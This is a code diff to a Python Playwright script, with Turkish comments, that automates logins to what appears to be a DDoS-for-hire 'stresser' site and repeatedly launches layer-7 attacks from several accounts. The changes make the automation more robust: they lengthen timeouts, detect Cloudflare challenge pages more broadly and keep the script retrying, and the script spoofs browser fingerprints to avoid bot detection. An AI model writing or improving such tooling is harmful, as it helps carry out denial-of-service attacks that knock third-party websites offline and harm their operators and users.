@@ -64,7 +64,7 @@ def attack_worker(account):
                         "--disable-features=IsolateOrigins,site-per-process",
                         "--disable-setuid-sandbox"
                     ],
-                    slow_mo=250
+                    slow_mo=500
                 )
                 page = context.new_page()
                 
@@ -74,25 +74,29 @@ def attack_worker(account):
                     Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                 """)
 
-                # ---------- GİRİŞ (GÜNCEL, EVALUATE YOK) ----------
+                # ---------- GİRİŞ (GÜÇLENDİRİLMİŞ) ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
+                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="load")
                     
-                    if "cf-browser-verification" in page.url or "challenge" in page.url:
-                        print(f"[{username}] ⚡ Cloudflare challenge, 30 saniye bekleniyor...")
-                        page.wait_for_timeout(30000)
-                        page.reload(wait_until="domcontentloaded")
-                        page.wait_for_timeout(5000)
+                    # Cloudflare / challenge kontrolü (genişletilmiş)
+                    if "cf-browser-verification" in page.url or "challenge" in page.url or \
+                       page.locator("text=Just a moment").count() > 0 or \
+                       page.locator("text=Checking your browser").count() > 0:
+                        print(f"[{username}] ⚡ Cloudflare / challenge algılandı, 60 saniye bekleniyor...")
+                        page.wait_for_timeout(60000)
+                        page.reload(wait_until="load")
+                        page.wait_for_timeout(10000)
 
-                    page.wait_for_selector("#username", timeout=30000)
+                    # Kullanıcı adı alanını 60 saniye bekle
+                    page.wait_for_selector("#username", timeout=60000)
                     page.fill("#username", username)
-                    page.wait_for_selector("#password", timeout=30000)
+                    page.wait_for_selector("#password", timeout=60000)
                     page.fill("#password", password)
-                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
+                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=60000)
                     page.click("#loginNextBtn", timeout=30000, force=True)
                     
-                    page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
+                    page.wait_for_url(lambda url: "/dash" in url, timeout=120000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
                 except Exception as login_err:
@@ -107,7 +111,7 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
+                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="load")
                     page.wait_for_timeout(3000)
                     page.wait_for_selector("#layer_7", timeout=20000)
                     page.click("#layer_7", timeout=30000, force=True)
@@ -153,7 +157,7 @@ def attack_worker(account):
                             time.sleep(2)
 
                         print(f"[{username}] 🔄 Sayfa yenileniyor...")
-                        page.reload(wait_until="domcontentloaded")
+                        page.reload(wait_until="load")
                         page.wait_for_timeout(3000)
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.click("#layer_7", timeout=30000, force=True)
@@ -163,7 +167,7 @@ def attack_worker(account):
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
-                            page.reload(wait_until="domcontentloaded")
+                            page.reload(wait_until="load")
                             page.wait_for_timeout(5000)
                             page.wait_for_selector("#layer_7", timeout=15000)
                             page.click("#layer_7", timeout=30000, force=True)
